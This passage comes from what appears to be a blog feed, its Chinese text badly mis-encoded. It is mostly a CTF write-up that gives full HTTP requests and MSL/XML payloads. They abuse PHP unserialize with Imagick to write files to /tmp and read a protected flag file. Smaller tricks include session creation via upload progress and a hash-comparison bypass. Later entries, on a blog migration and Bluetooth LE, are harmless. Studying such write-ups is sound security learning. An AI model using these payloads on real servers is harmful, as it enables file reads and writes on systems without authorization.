/?cmd=unserialze&amp;data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A4%3A%22func%22%3BN%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D HTTP/1.1<span class="token header-name keyword">Host:</span> 127.0.0.1:18080<span class="token header-name keyword">Cache-Control:</span> max-age=0<span class="token header-name keyword">Content-Length:</span> 709<span class="token header-name keyword">Content-Type:</span> multipart/form-data; boundary=------------------------c32aaddf3d8fd979--------------------------c32aaddf3d8fd979<span class="token header-name keyword">Content-Disposition:</span> form-data; name="whatever"; filename="whatever"<span class="token header-name keyword">Content-Type:</span> application/octet-stream&lt;?xml version="1.0" encoding="UTF-8"?>&lt;image> &lt;read filename="inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBfE86MTM6ImZ1bW9fYmFja2Rvb3IiOjQ6e3M6NDoicGF0aCI7czoxMzoiL3RtcC9zcXVpcnQxZSI7czo0OiJhcmd2IjtOO3M6NDoiZnVuYyI7TjtzOjU6ImNsYXNzIjtOO30=" /> &lt;write filename="/tmp/sess_squirt1e" />&lt;/image>--------------------------c32aaddf3d8fd979--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å†™æˆåŠŸã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1687795786583.png" alt="1687795786583"></p><p>æ¥ä¸‹æ¥å°±è¦æŠŠ<code>flag</code>å¸¦åˆ°<code>/tmp/squirt1e</code>ä¸­ï¼Œå› ä¸ºé¢˜ç›®è®¾ç½®äº†<code>open_basedir</code>ï¼Œæ²¡åŠæ³•ç›´æ¥è¯»ã€‚æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå¯¹æ–‡ä»¶å¤´è¦æ±‚ä¸ä¸¥æ ¼çš„æ–‡ä»¶åè®®å¹¶æ‰‹åŠ¨æŒ‡å®šï¼Œå› ä¸º<code>flag</code>ä¸æ˜¯å›¾ç‰‡ï¼Œé€šè¿‡<code>Imagick</code>ç§»åŠ¨ä¼šå¯¼è‡´æŠ¥é”™ã€‚</p><p>æœ€ç»ˆå‘ç°<code>mvg</code>ã€<code>uyvy</code>ã€<code>RGB</code>ä¸‰ç§æ ¼å¼å¯ä»¥åˆ©ç”¨ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1687796509728.png" alt="1687796509728"></p><p>å‰ä¸¤ä¸ªäº²æµ‹å¯ç”¨ã€‚</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mvg:/flag<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/tmp/squirt1e<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€åä¸€ä¸ªå‚è€ƒä½œè€…çš„<code>exp</code>æ²¡æˆåŠŸï¼Œè®°å½•ä¸€ä¸‹å§ï¼Œä¸‡ä¸€ä»¥åç”¨å¾—åˆ°å‘¢ã€‚</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- step2: copy flag --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- è®¾ç½®ä¸ºRGBæ ¼å¼ï¼Œè¯»å–flag --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- è®¾ç½®â¼€ä¸ªç©ºå›¾â½š --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token comment" spellcheck="true">&lt;!-- å°†ç©ºå›¾â½šå’Œflagæ•°æ®è¿›â¾æ‹¼æ¥ --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a1<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- æ·»åŠ åç§»åï¼Œè¯»å–flag --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1+1<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w1<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token comment" spellcheck="true">&lt;!-- å°†ä¸Šâ¼€å¼ å›¾â½šå’Œè¿™æ¬¡è¯»å–çš„flagè¿›â¾æ‹¼æ¥ --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a2<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- ä¸æ–­é‡å¤ï¼Œå¦‚æœè¯»å–è¶…å‡ºèŒƒå›´ï¼Œä¾¿ä¼šæŠ¥é”™ï¼Œå¹¶ç•™ä¸‹ä¸Šâ¼€æ¬¡å†™â¼Šçš„â½‚ä»¶ --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1+2<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w2<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a3<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+2<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1+3<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w3<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a4<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+3<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1+4<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w4<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a5<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+4<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1+5<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w5<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a6<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+5<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ä¸€äº›è„trick"><a href="#ä¸€äº›è„trick" class="headerlink" title="ä¸€äº›è„trick"></a>ä¸€äº›è„trick</h3><h4 id="php-session-not-started"><a href="#php-session-not-started" class="headerlink" title="php session not started"></a>php session not started</h4><p>æƒ³åŠæ³•æ•´ä¸ªsessionï¼Œåˆ©â½¤SESSION UPLOAD PROGRESSåˆ›å»ºâ¼€ä¸ª sessionï¼Œè¿™æ ·å°±å¯ä»¥çœ‹åˆ°æºç äº†</p><pre class="line-numbers language-http"><code class="language-http">POST / HTTP/1.1<span class="token header-name keyword">Host:</span> 115.239.215.75:8081<span class="token header-name keyword">Cookie:</span> PHPSESSID=1<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.9<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Content-Type:</span> multipart/form-data; boundary=------------------------c32aaddf3d8fd979<span class="token header-name keyword">Content-Length:</span> 204--------------------------c32aaddf3d8fd979<span class="token header-name keyword">Content-Disposition:</span> form-data; name="PHP_SESSION_UPLOAD_PROGRESS";<span class="token header-name keyword">Content-Type:</span> application/octet-stream1--------------------------c32aaddf3d8fd979--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ç»•è¿‡md5ä»¥åŠsha1å¼ºæ¯”è¾ƒ"><a href="#ç»•è¿‡md5ä»¥åŠsha1å¼ºæ¯”è¾ƒ" class="headerlink" title="ç»•è¿‡md5ä»¥åŠsha1å¼ºæ¯”è¾ƒ"></a>ç»•è¿‡md5ä»¥åŠsha1å¼ºæ¯”è¾ƒ</h4><p>åˆ©ç”¨ Error&#x2F;Exception å†…ç½®ç±»è¿›è¡Œhashç»•è¿‡ã€‚</p><p><code>$a = new Error(&quot;null&quot;,1);$b = new Error(&quot;null&quot;,1);</code></p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHPååºåˆ—åŒ– </tag>
            
            <tag> PHPå®‰å…¨ </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¢åšå®¢å•¦</title>
      <link href="/2022/11/14/huan-bo-ke-la/"/>
      <url>/2022/11/14/huan-bo-ke-la/</url>
      
        <content type="html"><![CDATA[<p>ä¸€å¹´å‰ä¹°çš„HUAWEIäº‘æœåŠ¡å™¨å³å°†è¿‡æœŸï¼Œæƒ³æ¥è¿™å·²ç»æ˜¯æˆ‘ç¬¬ä¸‰ä¸ªè¿‡æœŸçš„æœåŠ¡å™¨äº†-.-<br>è®°å¾—å½“æ—¶èŠ±å‡ åå—é’±å°±èƒ½ä¹°åˆ°ä¸€å°é…ç½®è¿˜ä¸é”™çš„æœåŠ¡å™¨ã€‚å¿ƒæƒ³å›½å†…å‚å•†çœŸå¤§æ°”ï¼Œæ¯•ç«Ÿå½“æ—¶ä¹Ÿè€ƒå¯Ÿè¿‡vultrã€é’ç“¦å°ç­‰å›½å¤–çš„vpsï¼Œä¸€å¹´è¦ä¸€ç™¾å¤šå—é’±ã€‚<br>å¦‚ä»Šç‚¹å¼€æ§åˆ¶å°ä¸€çœ‹ç»­è´¹ä»·æ ¼äººè¦æ™•æ‰äº†ï¼Œè¿™tmdæ˜¯æŠ¢é’±å•Šï¼ï¼ï¼å®¢æœä¹‹å‰è¿˜æ¥äº†ä¸‰ä¸ªç”µè¯è·Ÿæˆ‘è¯´æœåŠ¡å™¨ç»­è´¹æœ‰ä¼˜æƒ ï¼Œéš¾ä¸æˆä¸€ä¸ªæœˆ1800çš„ä»·æ ¼æ˜¯ä¼˜æƒ ï¼Ÿ<br>äºæ˜¯æˆ‘å†³å®šæ°¸ä¹…æŠŠåšå®¢è¿ç§»åˆ°githubä¸Šå»ã€‚é™æ€åšå®¢åªçŸ¥é“<code>hexo</code>äº†ï¼Œå¤§å®¶ä¹Ÿéƒ½åœ¨ç”¨è¿™ä¸ªã€‚ç›¸æ¯”äºç¬¨é‡çš„<code>Zblog</code>æ¥è¯´<code>hexo</code>å°±è½»é‡å¤šäº†ï¼Œä¸»é¢˜ä¹Ÿéå¸¸ä¸°å¯Œï¼Œå¹¶ä¸”ä¸éœ€è¦è´¹å¤§é‡æ—¶é—´æ¥ç»´æŠ¤ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é—²èŠ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å›½å†…æœåŠ¡å™¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½åŠŸè€—è“ç‰™BLEç®€è¿°</title>
      <link href="/2022/11/01/ble-xue-xi-bi-ji/"/>
      <url>/2022/11/01/ble-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<h3 id="BLEç®€è¿°"><a href="#BLEç®€è¿°" class="headerlink" title="BLEç®€è¿°"></a>BLEç®€è¿°</h3><ul><li>BLEï¼ˆä½èƒ½è€—è“ç‰™ï¼‰é¦–æ¬¡å‡ºç°åœ¨è“ç‰™è§„èŒƒ4.0ç‰ˆæœ¬ä¸­ã€‚BLEæ˜¯ä½œä¸ºå…¶å‰èº«ç»å…¸è“ç‰™BR&#x2F;EDRçš„æ›¿ä»£ã€‚ä¸‹å›¾æ˜¯ä¼ ç»Ÿè“ç‰™ï¼ˆBTï¼‰ä¸BLEçš„åŒºåˆ«ï¼Œä»å›¾å¯çŸ¥ç›¸æ¯”BTï¼ŒBLEçš„åŠŸè€—å°ï¼Œæ”¯æŒè·ç¦»å¤§ã€‚</li></ul><div align=center><img src="https://img-blog.csdnimg.cn/20210513101058738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FsZXhjZWw=,size_16,color_FFFFFF,t_70" alt="æ‘˜å½•" style="zoom:100%;" /></div><ul><li><p>BLEé™¤äº†ç‚¹å¯¹ç‚¹é€šä¿¡ï¼Œè¿˜æ”¯æŒå¹¿æ’­æ¨¡å¼ï¼šå…è®¸ä¸€ä¸ªè®¾å¤‡åŒæ—¶å‘æ— é™æ•°é‡çš„æ¥æ”¶è€…ä¼ è¾“æ•°æ®ã€‚æ¯ä¸ªè®¾å¤‡éƒ½èƒ½ä¸ç½‘ç»œä¸­çš„ä»»ä½•å…¶ä»–è®¾å¤‡è¿›è¡Œé€šä¿¡ã€‚å…¶ä¸­ï¼Œç‚¹å¯¹ç‚¹é€šä¿¡åŒ…æ‹¬é¢å‘è¿æ¥é€šä¿¡ä»¥åŠæ— è¿æ¥é€šä¿¡ï¼Œå¹¿æ’­æ¨¡å¼åªæœ‰æ— è¿æ¥é€šä¿¡ï¼ˆåºŸè¯QAQï¼‰ã€‚</p></li><li><p>BLEçš„é¢‘æ®µå’ŒWIFIä¸€æ ·éƒ½æ˜¯2.402 â€“ 2.480 GHzï¼Œæ¯ä¸ªä¿¡é“ä¹‹é—´é—´éš”ä¸º2hzï¼Œå› æ­¤æœ‰40ä¸ªä¿¡é“ã€‚å…¶ä¸­37ï¼Œ38ï¼Œ39ä¸ºå¹¿æ’­ä¿¡é“ï¼Œè¿™é‡Œéœ€è¦è¯´æ˜37,38,39åªæ˜¯é€»è¾‘é¡ºåº(å³Channel Index)ï¼Œä»ç‰©ç†ä¿¡é“ä¸Šçœ‹æ˜¯éš”ç€å¥½å‡ æ¡ä¿¡é“çš„ï¼Œè¿™æ˜¯å› ä¸ºè¦é˜²æ­¢æ”¶åˆ°æ•°æ®ä¼ è¾“ä¿¡é“çš„å¹²æ‰°å¯¼è‡´ä¸‰æ¡å¹¿æ’­ä¿¡é“å…¨éƒ¨æ— æ³•æ­£å¸¸å·¥ä½œã€‚å…¶å®ƒ37ä¸ªä¸ºæ•°æ®ä¼ è¾“ä¿¡é“ã€‚ä¸‹è¡¨ä¸ºè“ç‰™å®˜æ–¹ç»™å‡ºBLEä¸ç»å…¸è“ç‰™çš„åŒºåˆ«ã€‚</p></li></ul><table><thead><tr><th align="center">Attribution</th><th align="center">Bluetooth Low Energy (LE)</th><th align="center">Bluetooth Classic</th></tr></thead><tbody><tr><td align="center">é¢‘æ®µèŒƒå›´</td><td align="center">2.4GHz ISM Band (2.402 â€“ 2.480 GHz Utilized)</td><td align="center">2.4GHz ISM Band (2.402 â€“ 2.480 GHz Utilized)</td></tr><tr><td align="center">ä¿¡é“</td><td align="center">40 channels with 2 MHz spacing (3 advertising channels&#x2F;37 data channels)</td><td align="center">79 channels with 1 MHz spacing</td></tr><tr><td align="center">é€šé“ä½¿ç”¨ä¿¡æ¯</td><td align="center">FHSSï¼ˆè·³é¢‘ï¼‰</td><td align="center">FHSSï¼ˆè·³é¢‘ï¼‰</td></tr><tr><td align="center">è°ƒåˆ¶æŠ€æœ¯</td><td align="center">GFSK</td><td 